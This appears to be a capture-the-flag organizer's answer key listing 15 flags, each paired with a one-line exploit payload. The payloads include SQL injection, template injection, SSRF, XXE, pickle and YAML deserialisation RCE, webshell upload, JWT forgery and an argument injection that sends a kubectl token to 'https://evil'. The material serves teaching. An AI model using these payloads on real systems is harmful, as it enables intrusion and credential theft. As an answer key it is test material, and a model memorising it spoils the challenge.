# Flags (organizer)

All 15 verified live via `scripts/solve.py` (RESULT: ALL 15 FLAGS CAPTURED, exit 0).

| # | Port | Flag | One-liner exploit |
|---|------|------|-------------------|
| 1 | 8301 | `FLAG{metacat_unauth_err0r_sqli}` | `nodeId=x' UNION SELECT secret,name FROM cn_secrets-- -` |
| 2 | 8302 | `FLAG{drupal_webf0rm_twig_sst1}` | POST `message={{ config.__class__.__init__.__globals__['os'].popen('cat /flag').read() }}` |
| 3 | 8303 | `FLAG{tiktok_api_ssrf_t0_metadata}` | `/api/download?url=http://127.0.0.1:9999/latest` |
| 4 | 8304 | `FLAG{dompdf_strp0s_chr00t_byp4ss_lfi}` | `?src=file:///var/www/html-secret/flag.txt` |
| 5 | 8305 | `FLAG{cockpit_wildcard_upl0ad_w3bshell}` | POST `.php` to `/api/assets/upload?name=sh.php`, then `/uploads/sh.php?c=cat /flag` |
| 6 | 8306 | `FLAG{mcp_k8s_dash_server_arg_1nj}` | POST `{"name":"--server=https://evil"}` → kubectl leaks the token |
| 7 | 8307 | `FLAG{openremote_ets_xxe_f1le_r34d}` | POST XML with `<!ENTITY x SYSTEM "file:///flag">` |
| 8 | 8308 | `FLAG{termix_id0r_ssh_passw0rd_by_id}` | `/host/db/host/1/password?field=password` |
| 9 | 8309 | `FLAG{moodle_unsigned_jwt_upn_trust}` | forge JWT `{"upn":"admin@bastion.local"}`, any/no signature |
| 10 | 8310 | `FLAG{kong_percent_enc0d3_rbac_byp4ss}` | `GET /%61dmin/flag` (encoded 'a' evades RBAC) |
| 11 | 8311 | `FLAG{comfyui_unauth_p1ckl3_rce}` | POST a pickle whose `__reduce__` runs `cat /flag` |
| 12 | 8312 | `FLAG{maxsite_php_0bject_1nj3ct10n}` | cookie `maxsite_comuser=b64(O:13:"TemplateCache":1:{s:8:"template";s:5:"/flag";})` |
| 13 | 8313 | `FLAG{modelscope_yaml_l0ader_rce}` | POST `!!python/object/apply:subprocess.check_output [["cat","/flag"]]` |
| 14 | 8314 | `FLAG{ollama_pr3f1x_appr0val_byp4ss}` | POST `{"command":"ls; cat /flag"}` |
| 15 | 8315 | `FLAG{arcadedb_resp_m1ss1ng_auth}` | raw TCP: `GET flag` (RESP, no auth) |

## Scoring suggestion
Flat by discovery difficulty, e.g. recon/web (1,3,4,8,9,10) **100**, exploitation
(2,5,7,11,12,13,14) **200**, niche/modern (6,15) **250**. A broad board; a mixed
team can clear it in a few hours, individual categories stand alone for teaching.

## Notes
- Flags live in each challenge's source (`app/challenges/cNN.py` or the PHP
  `index.php`/Dockerfile). The shared Python image writes `/flag` = the selected
  challenge's flag at boot, which the file-read / RCE challenges rely on.
- `make check` runs every exploit in a throwaway container on `backlog_net`.
